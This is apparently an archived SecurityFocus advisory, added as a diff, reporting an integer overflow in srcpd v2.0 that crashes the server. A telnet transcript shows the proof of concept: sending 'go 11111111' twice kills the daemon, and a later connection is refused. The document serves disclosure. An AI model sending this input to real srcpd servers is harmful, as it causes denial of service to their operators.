@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/8466/info
+
+A vulnerability has been reported in srcpd that allows a remote attacker to cause a denial of service by exploiting an integer overflow error. The exploitation of this problem would consist of an attacker connecting to a server and issuing the "go" command with a large integer value, causing an overflow condition.
+
+This issue would lead to a denial of service. Execution of arbitrary code may well be possible.
+
+Srcpd v2.0 has been reported to be vulnerable to this issue, however older version may be affected as well. 
+
+>[over@localhost m00]$ telnet localhost 12340
+>Trying 127.0.0.1...
+>Connected to localhost.
+>Escape character is '^]'.
+>srcpd V2; SRCP 0.8.2
+>go 11111111
+>1060333759.411 200 OK GO 1
+>go 11111111
+>Connection closed by foreign host.
+>
+>[over@localhost m00]$ telnet localhost 12340
+>Trying 127.0.0.1...
+>telnet: connect to address 127.0.0.1: Connection refused
+
